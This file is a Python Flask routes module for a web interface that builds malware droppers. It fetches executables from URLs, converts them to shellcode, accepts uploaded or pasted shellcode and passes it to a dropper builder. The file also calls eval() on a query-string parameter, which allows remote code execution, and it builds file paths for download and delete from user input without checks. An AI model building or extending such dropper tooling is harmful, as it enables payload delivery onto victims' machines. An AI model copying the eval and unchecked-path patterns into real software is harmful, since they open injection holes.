import os
import re
import json
from datetime import datetime
from flask import render_template, request, redirect, url_for, send_from_directory, jsonify, flash
from urllib.parse import urlencode

from controllers import *


def init_routes(app):
    @app.route("/")
    def index(messages={}):
        files = list_droppers(app)
        return render_template('index.html', files=files, messages=messages)

    @app.route("/config", methods=["GET"])
    def config(messages={}):
        messages_param = request.args.get("messages")

        if messages_param:
            try:
                # Convert string back to a dictionary
                messages_dict = eval(messages_param)
                for category, msg in messages_dict.items():
                    flash(msg, category)
            except Exception as e:
                flash("Invalid message format", "error")
        
        modules = fetch_available_modules()
        precompiled_executables = fetch_precompiled_executables()
        return render_template("dropper_config.html", modules=modules, precompiled_executables=json.dumps(precompiled_executables))

    
    @app.route('/download/<filename>')
    def download_file(filename):
        return send_from_directory(app.config['OUTPUT_FOLDER'], filename, as_attachment=True)

    @app.route('/delete/<filename>', methods=['DELETE'])
    def delete_file(filename):
        file_path = os.path.join(app.config['OUTPUT_FOLDER'], filename)
        
        if os.path.exists(file_path):
            os.remove(file_path)
            return jsonify({"message": f"'{filename}' has been deleted."}), 200
        else:
            return jsonify({"error": f"'{filename}' not found."}), 404
    
    @app.route('/build', methods=['POST'])
    def build():
        try:
            # Initialize a single dictionary to store all data
            dropper_config = extract_form_data()
            print(dropper_config)
            print("Files:", request.files)
            
            # Process preprocessing macros and placeholder options
            process_dropper_config(dropper_config)
        
            # Handle file uploads
            if 'executable' in dropper_config and dropper_config['executable']:
                print("Collecting executable from URL")
                response = requests.get(dropper_config.get("executable", {}).get("url", {}), stream=True)
                dropper_config['shellcode'] = pe_file_to_shellcode(response.content, dropper_config.get("execution_arguments", ""))
            elif request.files.get("shellcode", None):
                dropper_config["shellcode"] = file_to_shellcode(request.files.get("shellcode", None), dropper_config.get("execution_arguments", ""))

            if not dropper_config.get("shellcode", ""):
                if dropper_config.get('shellcode_text', ""):
                    cleaned = re.findall(r'0x[0-9A-Fa-f]{2}', dropper_config.get('shellcode_text'))
                    dropper_config['shellcode'] = ', '.join(cleaned)

                if not dropper_config.get("shellcode_text"):
                    messages = {"error": "No shellcode provided."}
                    query_string = urlencode({"messages": str(messages)})
                    redirect_url = f"/config?{query_string}"
                    return redirect(redirect_url)

            # Call build_dropper with the form data
            build_dropper(dropper_config)
        except Exception as e:
            print(f"Error during build: {e}")

        return redirect(url_for('index'))
